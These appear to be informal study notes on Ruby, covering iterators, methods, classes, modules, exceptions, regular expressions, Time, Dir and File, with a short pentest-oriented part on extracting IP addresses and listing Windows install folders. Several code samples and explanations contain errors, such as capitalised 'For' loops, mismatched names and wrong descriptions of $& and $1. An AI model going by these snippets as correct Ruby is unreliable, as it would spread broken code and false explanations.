to_enum and nothing will happen to the original enumerable collection.   moreover: http://ruby-doc.org/core-1.9.3/Enumerator.html   External Iterators     There is also the possibility to use an enumerator object as an external iterator.   Enumerator objects allow you to control the iteration by yourself so you can create what is called external iterator.   Example:   → [1,2,3,4] enum = a.to_enum enum.next # Output: 1 enum.next  # Output: 2 enum.next # Output: 3 enum.next  # Output: 4 enum.next # Output: error   Altering Structured Control Flow   Like others programming languagues, in Ruby we can use:  break next redo      break transfer the control out of the loop or the iterator where it is contained.   if true, the next operation is the first statement after the end keyword.   For i in 1..10 \tprint i,\"\\s\" \tbreak if i==5 end  # Output:  1 2 3 4 5      next statement ends the current iteration and jumps to the next one. All the instructions that follow are not executed. It works the same way of the continue statement used in Java or C.   For i in 1..10 \tnext if i==5 \tprint i,\"\\s\" end  # Output: 1 2 3 4 6 7 8 9 10      Redo restarts the current iteration from the first instruction in the body of the loop or iteration    sum = 0 For i in 1..3 \tsum +=i \tredo if sum == 1 end   # Output: 7  # 1 + 1 + 2 + 3 = 7 &gt;&gt; the 1 repeats because of the redo   Begin / End     BEGIN allows the execution of Ruby code at the beginning of a Ruby program   END allows the execution of Ruby code at the end of a Ruby program    BEGIN {   puts \"\\n\",\"Beginning code\",\"\\n\" } END {   puts \"\\n\",\"Ending code\",\"\\n\" }  puts \"\\n\",\"Normal code\",\"\\n\"    Output:   → Beginning code  → Normal code  → Ending code      If there are more than one BEGIN block, they are executed following the order in which the Ruby interpreter encouters them.       END block instead, are executed in the reverse order in which they are encountered    Methods      Methods are a common structure - available in all high level programming languages.   They are used to define code abstraction, providing a specific semantic (what they can do) but hiding the implementation (the code necessary to obtain the semantic)   Simple method definitions  Syntax:  def &lt;method name&gt; (&lt;arguments list&gt;)   ...&lt;code block&gt;... end  // arguments list - can be empty   def double (x)   return x*2 end  double(2) # Output: 4   Parentheses  Ruby is flexible, it allows parentheses to be omitted when you invoke a method ( a space os required between the method name and the argument)  fibonacci(5) fibonacci 5 # both are correct   Alias      Ruby allows one to define aliases For methods   This is helpful if u wanna to have a method with a more natural or expressive name   def method_in_ruby   puts \"whatever\" end   alias mir method_in_ruby  mir # Output: \"whatever\"      Aliases are commonly used as a backup in order to extend the ability or functionality of a method    Parameters Default Values  U can specify default values For parameters of your methods. These values will be assigned when an actual parameter will be omitted.   def print_name(name = \"unknown\") \tprint \"\\s\",name,\"\\s\" end  print_name \"john\" # Output: john print_name # &lt;anything as parameter&gt; # Output: unknown # &lt;the method grab the default value&gt;   Variable Length Arguments     U can create a method that is able to handle variable length arguments as parameters   U have to add an * before one (and only one) of the parameters of your method   Then u can call the method with whatever arguments u want   The parameter with * captures them as an array   Example:  def method (first, *others)   puts \"first is: \"+first.to_s   print \"others: \"+others.to_s end  method(1,2,3)   first: 1   others: [2,3]   Hashes as Arguments     with hashes, you can invoke a method specifying explicitly (at calling time) the name of arguments.   Usually this style of programming is ideal when you have symbols such as hash key values. Therefore Ruby provides an elegant and useful syntax.   Example:  def printPerson(hash)   name = hash[:name] || \"Unkown\"   age = hash[:age] || \"Unkown\"   gender = hash[:gender] || \"Unkown\"   print name, \"\\s\",age,\"\\s\",gender end  printPerson name:\"ana\",age:27 # Output: Ana 27 Unknown   Block Arguments     Inside the method, we can invoke the code in the block with the yield statement.   Iterators do it For us silently   Yield transfers the control flow to the block associated with the method invocation   Example 1:  def method   puts \"inside method\"   yield   puts \"Again inside method\"   yield end  method {puts \"In the BLOCK now\" }   output:   → Inside method  → In the BLOCK now  → Again inside method  → In the BLOCK now      You can pass arguments with yield and use them in the block   Example 2:   def double(x)   yield 2*x end  double(5) { |x| print x } # Output: 10=&gt;nil double(5) { |x| puts x } # Output: 10 double(5) // without block  # Output: error      Yield is often used with iteration   This example method generates all the even numbers that are less than n and the block prints them to stdout.   Example:  def even(n)   for i in 2..n     yield i if i % 2 == 0   end end   even(10) {|x| print x, \"\\s\"}   2 4 6 8 10 =&gt; 2..10      if u do not want to use yield, Ruby allows you to pass a block as an argument. With this strategy, the block becomes an instance of the Proc class and u have to use call instead of yield to transfer the control to it.   To specify that an argument will be a Proc object that encapsulates a block you must use the ampersand (&amp;) in method definition.   Example 1:  def square_cube(n,&amp;p)   For i in 1..n \t  p.call(i**2) # or yield i**2 \t  p.call(i**3) # or yield i**3   end end  square_cube(5) {|x| print x,\"\\s\"} \t1 1 4 8 9 27 16 64 25 125 =&gt; 1..5      Proc object as normal argument values   square = Proc.new {|x| print x**2,\"\\s\"}  def print_proc(n,pr)   for i in 1..n \t  pr.call(i)   end end  print_proc(8,square) # Output: 1 4 9 16 25 36 49 64 =&gt; 1..8   Bang methods     They are methods that end with an exclamation mark !   They modify the object that is called.   Usually common bang methods are related to Array or Hash.   Returned Values  If we return more than one value, its converted to an array automatically:  def ret_value   return 1,2,3,4 end array = ret_value \t[1,2,3,4] array \t[1,2,3,4]    Variables &amp; Scope      Ruby is dynamically typed language: u can create a variable without specifying its type.   It infers the type from the type of object u assign to it   u can change the type of variable by changing its referenced object type   There is 4 types of variables in Ruby:  local: visible within a method or block global: visible throughout a Ruby program instance: visible within an object instance class: visible within all class instances   Local variables     begin with a lowercase letter or an underscore _   they are visible within a specific local area of the Ruby source code (method, class, module).   Statements like For, While, iF, etc.. do not define a new scope. Variables defined inside them are still accessible outside.   → kernel statements - http://ruby-doc.org/core-1.9.3/Kernel.html      define new scope   Example: loop   The following control structures define a new scope:  def ... end class ... end module ... end loop { ... } proc { ... } iterators/method blocks the entire script      u can verify the scope of a variable by using the define? method    Global variables     begins with the $ special character. It has a global scope, meaning that it can be visible and accesible. anywhere in the program.   Some pre-defined global variables. Some examples:  $* : array of command line arguments $0 : name of the script being executed $_ : last string read by gets  → moreover: http://ruby-doc.org/core-2.0/doc/globals_rdoc.html   Example: reads a line and prints it:  print \"write something: \\t\" $stdin.gets print \"gets: \\t\\t\\t\",$_ puts   Instance &amp; Class Variables     class variables begin with @@ and they are visible by all instances of a class   instances variables begins with @. They are local to specific instances of a class   Constants     Begins with an uppercase. THey should not be changed after their initialization   However Ruby allows u to change them but with a warning   Belongs to the scope   Example:  A = 100 module B   A = 200 end  A # Output: 100 B::A # Output: 200 // we can access the constant of the module by using its namespace B::A   Another global examples:  ARGV : holds command line arguments ENV : holds information about environment // moreover: http://ruby-doc.org/core-2.0/doc/globals_rdoc.html   tricks  We can declare multiple variables:     → a,b,c = \"a\",\"b\",\"c\"   Swap two variables without using a temporary one:  x=10  y = 20 x,y=y,x   Classes Principles  How to define a class:  class &lt;Name&gt;   ...&lt;class body&gt;... end    &lt;Name&gt; must begin with a capital letter. This holds because Ruby creates the constante &lt;Name&gt; to refer the class, so the capital letter is required.   Create a class:  class Myclass   def hello \tprint \"Hello\"   end end  // instantiate an object MyObj = MyClass.new  // invoke an object method MyObject.hello # Output: Hello   →  moreover: http://ruby-doc.org/core-1.9.3/Class.html   Instance Variables     are variables available only to each instance of the class, meaning that they change from object to object.   they are defined within class definition using the special character @   instance variable are only accessible via the instances public methods. So you have to define accessors methods to read them and setters methods to set them.   To inialize them, the default constructor method in Ruby is initialize   class MyClass   #constructor method   def initialize(a) \t  @a = a   end   # setter method   def a=(value) \t  @a = value   end   # getter method   def a \t  @a   end end   // All instances of MyClass have their own instance variable (@a) which is accessible thanks to the getter and the setter method ‘a’.      instances variables are resolved in the context of self. When we invoke a method, self refers to an instance of a Class. Otherwise inside a Class but ouside any method, self is the object that represents the class,   Getter / Setter through Metaprogramming     with the attr_accessor keyword, Ruby silently defines a getter and a setter For us.   it requires a symbol notation but it defines real instance variables @x, @y   class QuickGS   attr_accessor :x,y end obj = QuickGS.new  obj.x, obj.y = 100,300 print obj.x\" \" obj.y # Output: 100 300      with the attr_reader keyword, Ruby silently difines a getter.    class QuickG   attr_reader :x,y   def initialize(x,y) \t@x,@y = x,y   end end obj = QuickG.new(10,20)      we can print, but we cant set        because the setter has not been defined       Attr is another useful keyword   If used alone, it defines a getter while with true it defines a setter too:  class QuickGS   attr :x,true   attr :y   def initialize(x,y) \t@x,@y = x,y   end end obj = QuickGS.new(10,20)  obj.x = 100 # Output: 100 obj.y = 200 # Output: error   Class Methods  Self refers the current object:  class C1   def self.say \tprint \"hello\"   end end c1.say # Output: hello       Since a Class is an object, we can define Class object instance variables with getter and setter too.   Class methods may be defined in a few other ways:   → Using the class name instead of self keyword   → Using the « notation      the « notation is useful when u work with classes that have been already defined.    Class Variables     must start with @@ and its shared among all class instances   Class Contants  They are accessible from outside using ::notation  class MyClass   C1 = \"hello\" MyClass::C1 # Output: hello   Open Classes     Generally in conventional OO languages, when you close the class definition you cannot add anything else in it, unless you use some advanced technique and tools like reflection   Ruby allows u to open a defined class in order to add other methods, constants, etc  class String   def dsize \tself.size * 2   end end \"Hello\".size # Output: 5 \"Hello\".dsize # Output: 10 // the string class already exists, the method dsize is added to it.   Operator Methods     Point class represent a simple point in Euclidean geometry.   Example:  p1(1,2) - p2(10,20) p1 + p2 = p3(11,22)      The sum of two points will return a new point that contains the sum of the coordinates x and y   class Point   attr :x,:y \t   def initialize(x,y)     @x,@y=x,y   end   def +(other)     Point.new(@x+other.x,@y + other.y)   end end   // two coordinates (x,y). each of them has a getter // there is no setter or other method to change them   Mutable / Immutable values     In the previous Point example, we used Point as immutable values   This new Point class creates a mutable object value. Each coordinate has its own setter   class Point   attr_accessor :x, :y      def initialize(x, y)     @x, @y = x, y   end    def +(other)     @x += other.x     @y += other.y     self   end end       The + operator changes the first object and returns it as a result.   A Point value can change its coordinate values using both the setters and + operation.   Method Visibility     Ruby allows u to define protected and private methods too   Private Methods     u can define private instance methods and private class methods   Private instance methods can only be called by other instance methods of the class (and subclass). You cannot call them from outside an object.   A famous Ruby private instance method is initialize. U cannot call it from outside:  obj.initialize &gt; error           initialize is an exception because in Ruby all methods are public by default            Private instance methods are defined using the private keyword. With used without arguments, all the methods bellow this keyword are private       Example 1:  class AClass   # Public methods   def getName     privateName   end    private   # Private methods below   def privateName     \"I'm AClass\"   end end    Example 2:  # u can specify which methods to treat as private  class AClass   # Public methods   def getName     privateName   end    def privateName     \"I'm AClass\"   end    # Specify private methods   private :privateName end       if u want to specify class methods as private   u can use the private_class_method keyword   Protected Methods     Protected methods work as private methods but protected methods may be called by any instance of the defining class or its subclasses.   A full view   class ComplexClass   # Public instance methods    protected   # Protected instance methods    private   # Private instance methods    class &lt;&lt; self     # Public class methods      protected     # Protected class methods      private     # Private class methods   end end       Private methods is not a secure way to hide something. A different technique such as meta-programming (via send method) or reflection API allows to bypass private/protected methods   →  moreover reflection API = http://en.wikipedia.org/wiki/Reflection_(computer_programming)   Subclassing &amp; Inheritance      A mechanism to extend a class in order to modify its behavior or add new functionalities: subclassing   A class may have multiple subclasses but classes in general can only extend one class (a class has only one superclass).   When u define a new class, if nothing is specified, it automatically extends the Object Class.   The Objec Class extends another Ruby utility Class: BasicObject   Therefore the root class in Ruby is BasicObject   Simple extensions  - Extending a class is very simple, just use the **&lt;** operator.  - A class inherits all superclass methods   class Person   attr_reader :name    def initialize(name)     @name = name   end end  class Italian &lt; Person end  marco = Italian.new(\"Marco\") puts marco.name # Output: Marco    Methods Overriding     subclassing is Ruby is strongly discouraged if u do not properly know the superclass that u want to extend   u might override some private methods that are fundamental For the class to work properly   To override a method, simply define it in the subclass.   A common overridden method is to_s = to string   By default a class extends the Object class and that to_s is a method that Object class hold:  class Italian &lt; Person   def to_s     \"Sono #{name}\"   end end   marco = Italian.new(\"Marco\") marco.to_s # Output: Sono Marco   Specialize a Method     the super keyword help us avoid the complete redefinition of method behavior   with super, u can call the method of the superclass   u can use super with or without arguments:  class Vehicle   def initialize(type)     @type = type   end    def to_s     \"I'm a #{@type} vehicle\"   end end  class Car &lt; Vehicle   def initialize     super(\"land\")   end    def to_s     super + \". I'm a car\"   end end    Instance and Class Variables      Inheritance does not affect instance variables   Class variables are shared and visible from instance methods, class methods and by the class definition itself.   Constants     They are inherited and they can be overridden   when u try to override an inherited constant, Ruby creates a new one with the same name but available only For the subclass.   Private methods     Private methods can be used inside inherited classes   Private methods are inherited   Protected methods     They are inherited and can be used similar to private methods   The difference is that you have to use them in an explicit way (object.method notation) when used inside (and not outside) a class or subclass.   Modules      http://ruby-doc.org/core-1.9.3/Module.html   its used to define namespaces and mixins.   A module is essentially a collection of methods, constants and class variables with a name.   The main difference between classes and modules:  → Modules cannot be instantiated  → They cannot be subclassed, therefore there is not a module hierarchy   Namespace     Is a way to collect and bind related methods and constants, giving them a name that helps u to use them.   http://ruby-doc.org/core-2.1.0/Math.html   Math is the most suitable example of modules used as namespace   Its a collection of mathematical constants (PI and E) and methods, especially For basic trigonometric and transcendental functions.   Modules and namespaces allow u to define custom Libraries: collection of constants, classes, other modules and so on.   Mixin     Mixin means that if a module defines instance methods (instead of class methods), those instance methods can be mixed into another class; the implementation of the class and the module are joined.   To mix a module into a class, use the include keyword   Example:  module B   def hello; \"Hello\"; end end  class A   include B   def world; \"World\"; end end  obg = A.new  print obj,hello, \" \", obj.world # Output: Hello World =&gt;nil      Two useful Ruby modules designed For mixin are Comparable and Enumerable   if your class defines the operator &lt;=&gt;, u can include Comparable to get free operation like:   '&lt;','&lt;=','==','&gt;','&gt;=' and between?      If Enumerable is mixed with your class, it gives u sort, find, min, max, etc… without the need to implement them   The Ruby platform provides other usable classes as well. Each one requires that your target class implements some methods in order to work correctly.   Namespace and Mixin Together     Nothing prevents the use of a module both as a namespace and as a mixin; just provide both instance and class methods to the module   Math For example: once we include Math, we do not need to specify Math:: to access its contants, methods and so on  Math::PI # Output: 3,14 Math::E # Output: 2.71 Math::sqrt(25) # Output: 5.0  include Math Object PI # Output: 3,14 E # Output: 2.71 sqrt(25) # Output: 5.0   Exceptions     http://ruby-doc.org/core-1.9.3/Exception.html   we should provide some code to execute when theses errors happen in order to retrieve a correct execution flow.   usually subclasses of exception are used to add information about the type of exception raised or to distinguish different exceptions.   Raise     Exception are objects but they are usually created with the method raise (instead of new).   Raise alone creates a RuntimeError   RuntimeError  raise \"A runtime error\"   Other Errors  With raise, you can specify the Error type too:  → raise ArgumentError, \"Invalid argument\"  def int_sum(a,b)   raise(ArgumentError,\"a isn't Int\") if !a.is_a?Integer   raise(ArgumentError,\"b isn't Int\") if !b.is_a?Integer   a + b end  inst_sum \"a\",10 # Output: \"a isn't Int\"   Custom Error     ArgumentError, RuntimeError, ZeroDivisionError are subclasses of StandardError   Lets use NoIntError   First we define the new class NoIntError that is inherited from StandardError.   Its our custom error class:  class NoIntError &lt; StandardError; end;  def int_sum(a,b)   raise(NoIntError,\"a isn't Int\") if !a.is_a?Integer   raise(NoIntError,\"b isn't Int\") if !b.is_a?Integer   a + b end  inst_sum \"a\",10 # Output: \"a isn't Int\"   Rescue  → http://ruby-doc.org/core-1.9.3/Exception.html     If u want to handle an exception and execute some arbitrary code when it happens, you can use rescue   rescue is defined as a clause that can be attached to other statements (begin is the most common)   Simple Rescue     $! refers to the last Exception object   if u call the fact method with an integer less than 0, its executed infinite times because return statements are always false. Therefore at some point, the script spends all its memory.   At some point, an exception is raised by Ruby because the stack is full. Rescue catches the exception object and global variable $! stores it.   def fact(n)   return 1 if n==0   return 1 if n==1   n * fact(n-1) end begin   a=fact(ARGV[0].to_i)   p a rescue   p $!.message end   Exception Objects     $! refers to the last exception object. u can use a personal variable with rescure.   In the example, we use exc instead of $!   def fact(n)   return 1 if n==0   return 1 if n==1   n * fact(n-1) end begin   a=fact(ARGV[0].to_i)   p a rescue =&gt; exc   p exc.message end   Type based exception handling     U can handle exceptions by their type: ```ruby   def int_sum(a,b)   raise TypeError if !(a.is_a?Integer)   raise TypeError if !(b.is_a?Integer)   a + b end   begin   print “2 + 3 = “.int_sum(2,3),”\\n”   print int_sum(2) if ARGV[0] == “argument”   print int_sum(“a”,10) if ARGV[0] == “type” rescue ArgumentError =&gt; ae   print “ArgumentError rescue: “   print ae.message, “\\n” rescue TypeError =&gt; te   print “TypeError rescue: “   print te.message,”\\n” end    &gt; Rescue can follow any statement. If an exception occurs, the body of rescue is executed.  ### Other Clause ```ruby - retry - else - ensure   Retry     its a clause that can be used inside a rescue clause to re-execute the block of code that has caused the exception.   Imagine that u want to update a db and an exception occurs (a network error, a DB error, etc). U may try again (the network may be available later).   with retry u can do that   example: ZeroDIvisionError   a = ARGV[0].to_i b = ARGV[1].to_i  begin   print \"#{a} / #{b} = \"   print a / b,\"\\n\" rescue   print \"Error\\n\"   b=1   retry end      Be careful when using retry, cause it can cause a infinite loop   Else     Its used to execute some arbitrary code when rescue does not catch any exception   else may be put after a rescue clause.   begin   # code rescue   # code else   # code end   Ensure     its used to specify some code that is always executed at the end of the begin flow.   The code is always executed even if an exception occurs inside the main control flow.   ensure may be inserted after all rescue and else clauses.   begin   # normal flow rescue   # exception handling else   # no exception occur ensure   # always executed end   Methods, Classes and Modules     U can use all the previous concepts and clauses with methods, classes and modules as well without the need of begin keyword   Example:  def my_method(a,b,c)   # normal flow rescue    # exception handling else   # no exception occur ensure   # always executed end   Ruby is much more  There are many other statements, techniques and features:  → Proc and Lamba abstraction → Closures → Functional programming and higher order function → Reflection → Metaprogamming   Pentest   Regular Expressions  Dates and Time  Files and Directories  File Stream  Working with Nmap Files   Regular Expressions      Its a set of characters that describes a search pattern   usually a pentester uses regular expressions to filter and extract information in documents, client-server communications, tools output, and much more.   For example, we can use them to extract all the email addresses of a web page as well as filter nmap results.   From a defensive pov, regular expressions are also commonly used to verify and sanitize inputs. This may be used to avoid the input having bad character or invalid text.   Basic Concepts     A regular expression (regex or regexp) is usual delimited by forward slash in all languages:  /regex body/   example:   The =~ is the Ruby basic pattern matching operator. It returns nil if the string does not contain the pattern; otherwise it returns the index where the first match begins   \"Hello World\" =~/World/ # Output: 6 \"Hello World\" =~/Torld/ # Output: nil   Regexp Object     regex are instances of the regex class; therefore they are regex objects   u can create a regex object with:  literal notation ( **/pattern/** ) **%r** notation OO notation   Delimiters are custom:  /hello/ = literal notation %r{hello} = {} delimiters %r!hello! = ! delimiter   OO notation just use new or compile as synonym For regex.new:  Regexp.new(\"hello\") Regexp.compile(\"hello\")   Regexp Modifier     u can add flags to specify additional information about the matching that has to be performed   i is used For case insensitive matching. when add after the last / it returns the index of the match   \"Hello World\" =~/hello/i # Output: 0 \"Hello World\" =~/world/i # Output: 6      with OO notation, u have to specify the attribute   reg = Regexp.new(\"hello\",Regexp::IGNORECASE) \"Hello World\" =~reg # Output: 0 \t reg = Regexp.new(\"world\",Regexp::IGNORECASE) \"Hello World\" =~reg # Output: 6   → moreover = http://www.ruby-doc.org/core-1.9.3/Regexp.html   Match method     if u have a regexp object and u invoke match on a string, it gives u another object that describes the match (a MatchData object)   with a matchData object, u can get some information about the matching such as the position of the matched substring, the matched words and much more.   u can treat MatchData as an array - where at each position u can find the matching substring.   //no matching  matching = /world/.match(\"Hello World\") # because its case sensitive # Output: nil matching = /world/i.match(\"Hello World\") # with **i** flag, we disable the case sensitive and have a match # Output: &lt;MatchData \"World\"&gt; matching[0] # Output: \"World\" matching[1] # Output: nil matching.begin(0) # Output: 6   Special Characters  Characters w/ special meaning:  () [] {} . ? + | ^ $      To use them, u have to use a backslash ** in order to escape them.   \"Hello World)\" =~/\\(/  # Output: 12 \"Where are you from?\" =~/\\?/ # Output: 18   Regular Expression Syntax                  Rule       Matching                 .       A single character (it does not match newline)                 []       At least one of the character in square brackets                 [^]       At least one of the character not in square brackets                 \\d       A digit. Same as [0-9] (0-9 means from 0 to 9)                 \\D       A non digit characters. Same as [^0-9]                 \\s       A white space                 \\S       A non whitespace                 \\w       A word character, same as [A-Za-z0-9]                 \\W       A non word character           Example:  \"Hello World\" =~/auh/ # does not contain auh # Output: nil  \"Hello World\" =~/[auh]/ # does not contain 'a' 'u' or 'h' # Output: nil \"Hello World\" =~/[auh]/i # contain 'H' at index 0 # Output: 0 \"Hello World\" =~/[0-9]/ # Output: nil \"Hello World\" =~/[\\d]/ # Output: nil \"I'm 50\" =~/[\\s]/ # whitespace at index 3 # Output: 3 \"Hello World!\" =~/[\\W]/ # '!' at index 10 - its a non word # Output: 10   Sequences     Is a concatenation of regular expression. The string must match the resulting concatenated pattern.                  Rule       Matching                 xy       Regular expression x followed by regular expression y           Example:  \"abc 123 abc \" =~/\\d\\d\\d\\s/ # 3 digit followed by a whitespace - matched at index 4 # Output: 4   Alternatives  (  |  pipe character ) are used to specify that the string must match at least one of the two or more regular expressions.                  Rule       Matching                         x       y       Either regular expression x or regular expression y           Example:  \"Hello World\" =~/\\s|\\./ # a whitespace or a point # Output: 5 \"Hello.World\" =~/\\s|\\./ # a whitespace or a point # Output: 5   Groups     The specials characters ( and ) are used to group a regular expression into a unique syntactic unit                  Rule       Matching                 (exp)       exp is grouped as a single unit           Example:  \"I'm Ruby\" =~/Rub(y|ber)/ # Output: 4 \"I'm Rubber\" =~/Rub(y|ber)/ # Output: 4 \"I'm Ruber\" =~/Rub(y|ber)/ # cause there is not ruber, only rubber # Output: nil      Groups are often used to capture more than one pattern inside a string   With MatchData objects, we can get a description of these patterns: matched words, positions and much more.   Example:  reg = /(Ruby).(Perl)/ matching = reg.match(\"I like Ruby&amp;Perl\")  matching[0] # the entire matching # Output: \"Ruby&amp;Perl\"  matching[1] # ruby word matching # Output: \"Ruby\" matching[2] # perl word matching # Output: \"Perl\" matching.begin(0) # the entire matching index # Output: 7 matching.begin(1) # ruby word matching index # Output: 7 matching.begin(2) # perl word matching index # Output: 12   → moreover = http://www.ruby-doc.org/core-1.9.3/MatchData.html   Repetitions                  Rule       Matching                 exp*       Zero or more occurrences of exp                 exp+       One or more occurrences of exp                 exp?       Zero or one occurrence of exp                 exp{n}       n occurrences of exp (N is a natural number)                 exp{n,}       n or more occurrences of exp                 exp{n,m}       at least n and at most m occurrences of exp           Example:  \"RubyRubyRuby\" =~/(Ruby){3} # Output: 0 \"RubyRubyRuby\" =~/(Ruby){4} # Output: nil   Anchors     Are used to specify the position of the pattern matching.                  Rule       Matching                 ^exp       exp must be at the begin of a line                 exp$       exp must be at the end of a line                 \\Aexp       exp must be at the begin of the whole string                 exp\\Z       exp must be at the end of the whole string                 exp\\z       same as \\Z but match newline too           Examples:  \"Hello World\" =~/^Hello/ # Output: 0 \"Hello World\" =~/\\AHello/ # Output: 0   A real world example     Let us suppose u have a string that contains an IP address and we want to identify its position as well as extract its parts separated by dots (octet of the address).    /(\\d{1,3}).(\\d{1,3}).(\\d{1,3}).(\\d{1,3})/  ip_reg = /(\\d{1,3}).(\\d{1,3}).(\\d{1,3}).(\\d{1,3})/ my_ip = ip_reg.match(\"Some text... 192.168.1.1 other text ... \") my_ip.to_a # Output: ['192.168.1.1','192','168','1','1']       the last example does not identify only IP, what if the string contains 999.999.999.999?   There is a lot of standard and verified regular expressions that u can use according to your needs in the internet.   Regular expressoins in the Ruby platform     Global variables   Working with string   Global Variables                  Variable       Description                 $~       The MatchData object of the last match                 $&amp;       The substring that matches the first group pattern                 $1       The substring that matches the second group pattern                 $2, $3, etc       And so on           Example:   \"Hello World !!!\" =~/^(hello)\\s(world)\\s(!!!)$/i # Output: 0 $~ # Output: #matchdata \"Hello World !!!\"  $&amp; # Output: \"Hello World !!!\" $1 # Output: \"Hello\" $2 # Output: World $3 # Output: \"!!!\" $~.to_a # Output: [\"Hello World !!!\", \"Hello\", \"World\", \"!!!\"]       The most important is $~ because all others are derived from it.   Working with strings     u can use regexp For all the methods seen in the Basic section: sub, gsub, split and more.   method scan   allows u to iterate through more occurrences of the text matching in the pattern   Example:  text = \"abcas 192.168.1.2 textomtxo 192.168.4.20 more text\" pattern = /(?:\\d{1,3}\\.){3}(?:\\d){1,3}/ text.scan(pattern) { |x| puts x }   192.168.1.2   192.168.4.20      (?:exp) = this syntax avoid capturing the subexpression inside ( ) so only the entire external expression is captured (the IP address)    Dates and Time     Time class   Other classes   Time class     Provides methods to work with your operating system date and time functionality.  → http://www.ruby-doc.org/core-1.9.3/Time.html   Create a time instance  Current system time:  TIme.new   Current time converted in utc:  Time.new.utc   Time.local is a synonymous For Time.new:  Time.local(2014,5,6) # Output: 2014-05-06 00:00:00 + 0200   Components of a time  t = TIme.local(2014,1,13,11,50) # Output: 2014-01-13 11:50:00 +0100 t.year # Output: 2014 t.month # Output: 1 t.day # Output: 13 t.hour # Output: 11 t.yday # Output: 13   Predicates and conversions  t = Time.now # Output: 2014-01-13 11:36:30 +0100  t.tuesday? # Output: false t.monday? # Output: true t.utc? # Output: false   Conversion between zone may be useful too:  t = Time.new.utc # Output: 2014-01-13 10:42:47 UTC t.zone # Output: \"UTC\" t.localtime # Output: 2014-01-13 11:42:47 +0100 t.zone # Output: \"CET\"  // timestamp t.to_i # Output: 1389610659  // an array t.to_a # Output: [39, 57, 11, 13, 1, 2014, 1, 13, false, \"CET\"]    Arithmetic  Simple operations with time (+ and -) in order to add seconds to your time object:  t = Time.now # Output: 2014-01-13 12:21:40 +0100  t + 20 //add 20 seconds to t t + 60*60 //add an hour to t t + 6*(60*60*24) // add 6 days to t       gem install -r active_support    // this gem adds some useful methods when u work w time arithmetic   require 'active_support/core_ext/numeric/time'  true  10.days # Output: 864000 t = TIme.now \t... t + 10.days # add 10 days t + 1.week # add 1 week       if u do not want to install a gem, u can write your own version.    class Numeric   def days; self*60*60*24;end end  t = TIme.now # grab current time t + 10.days # add 10 days   Comparisons  now = Time.now before = now -50 after = now +50  now &gt; before # Output: true after &gt; before # Output: false before+50==now # Output: true   From time to string  u can obtain a string with to_s or ctime method:  t.to_s t.getutc.to_s t.ctime t.getutc.ctime      strftime method formats Time objects according to the directives in the given format string.   Directives begin with the % character:  %Y = year %m = month %d = day etc   Example:  t.strftime(\"%Y/%m/%d\")   \"2014/01/14\" t.strftime(\"%H:%M:%S\")   \"10:33:22\"   There is combinations directives:  %c = date and time %D = date %F = ISO 8601 %r = 12hour time %R = 24hour time %T = 24 hour time with seconds   → moreover = http://www.ruby-doc.org/core-1.9.3/Time.html   Other Classes     Date = its used to manage date   DateTime = its subclass of Data and it allows to manage time too      both can be used like Time. But its slower    Files and Directories     Dir : For directories   File : For files   Dir     dir class defines class methods that allows u to work with directories. It provides a variety of ways to list directories as well as their content. It can also be used to know where the Ruby script is executed or to navigate between file system directories.   Current Directory     pwd and getwd class methods can be used to identify the current working directory.   Dir.pwd # Output: \"/root/ruby\" Dir.getwd # Output: \"/root/ruby\"      The home method instead returns the home directory of the current user (or the home directory of the given user)   Dir.home # Output: \"/root\" Dir.home(\"root\") # Output: \"/root\" Dir.home(\"mark\") # Output: \"/home/mark\"      The chdir method can be used to change the current directory   Dir.pwd # Output: \"/root/ruby\" Dir.chdir(\"dir_example\") Dir.pwd # Output: \"/root/ruby/dir_example\"      with chdir u can also use .. (back to parent directory)   u can use with blocks of code (loops)   puts Dir.pwd Dir.chdir(\"nested_dir\") do   puts Dir.pwd end puts Dir.pwd   Output:  /root/ruby/dir_example /root/ruby/dir_example\t/nested_dir /root/ruby/dir_example   Creation / Deletion     mkdir method to create directories   Dir.mkdir(\"teste\")      delete, rmdir,unlink to delete an existing directory   Dir.unlink \"test\"   Directory Listings     entries returns an array containing all files in the given directory   Dir.pwd # Output: '/root/' Dir.entries(\".\") # le dot means the current folder # Output: ['chdir.rb', '.', '..', 'chdir-rb~', 'nested_dir', 'test']      with a iterator we can use foreach   Dir.foreach(\".\") do |file|   puts file end      glob method or [] allows to search files and directories in the file system, according to a specific pattern.   → moreover = http://en.wikipedia.org/wiki/Glob_(programming)   Example to list all rb files in the directory:  Dir[\"*.rb\"] Dir.glob(\"*.rb\")   → moreover glob references - http://ruby-doc.org/core-1.9.3/Dir.html   Testing Directories     Exist? and exists? can be used to test if the specified path is a directory   Dir.exist? \"/path\" Dir.exists? \"/path\"   Dir Objects  dir = Dir.new(\"dir_example\") dir.each {|x| puts x} //it will list all files   Windows Application Directory Listing Example     check if an application is installed on a Windows machine and if its, it tries to list the content of the directory.   Usually Windows applications are installed in the following directories:   → C:\\Program Files → C:\\Program Files (x86) → C:\\  directories = [ 'C:\\\\Program Files\\\\', 'C:\\\\Program Files (x86)\\\\', 'C:\\\\' ]  installed = false \\for dir in directories do dir = dir + ARGV[0] if Dir.exist? dir then   installed = true;   puts %Q!\"#{dir}\" exists!   puts \"\\nListing: \"   Dir.foreach(dir) { |x| puts x } end end  if !installed then   puts ARGV[0] + \" is not installed\" end    Files      This class allows programmers to work with files: open a file, get information about it, change its name, change its permission and much more.  → http://ruby-doc.org/core-1.9.3/File.html   Check if a file exists:  File.exist? \"empty_file.txt\" # Output: true   Get the file size in bytes:  File.size \"teste.txt\" # Output: 2976   Returns the size in bytes or nil if the file is empty:   File.size? \"test.txt\"  # Output: nil   Returns true if the file is empty:  File.zero? # Output: true   Check if the argument is a file, directory or a symbolic link:  File.file? \"test.txt\" # Output: true File.directory? \"nested_dir\" # Output: true File.symlink? \"test_link\" # Output: true   U can check the type directly with ftype:  File.ftype \"test.txt\"  # Output: \"file\"   Methods readable?, writable? and executable? can be used to test permissions:  File.readable? \"test.txt\" # Output: true File.writable? \"test.txt\" # Output: true File.executable? \"test.txt\" # Output: false   mtime and atime returns respectively the last modification time and the last access time as a Time object:  at=File.atime \"test.txt\" # Output: \"2014-01-17 11:09:24 +0100\" at.getutc mt = File.mtime \"test.txt\" mt.getutc   ctime can be used on Windows to retrieve the creation time:  File.ctime \"test.txt\"   stat method returns a File::Stat object that encapsulates common status information about the file:  st = File.stat \"test.txt\" st.size # Output: \"3185\" st.atime # Output: \"2014-01-17 11:32:14 +0100\"   Working with Names  basename method can be used to extract the file name form a path. If u specify the suffix argument then the suffix itself is removed from the result:  File.basename path # Output: \"test.txt\" File.basename(path, \".txt\") # Output: \"test\"   dirname method can be used to extract only the directory part of a path string. This will cut the last part from the string 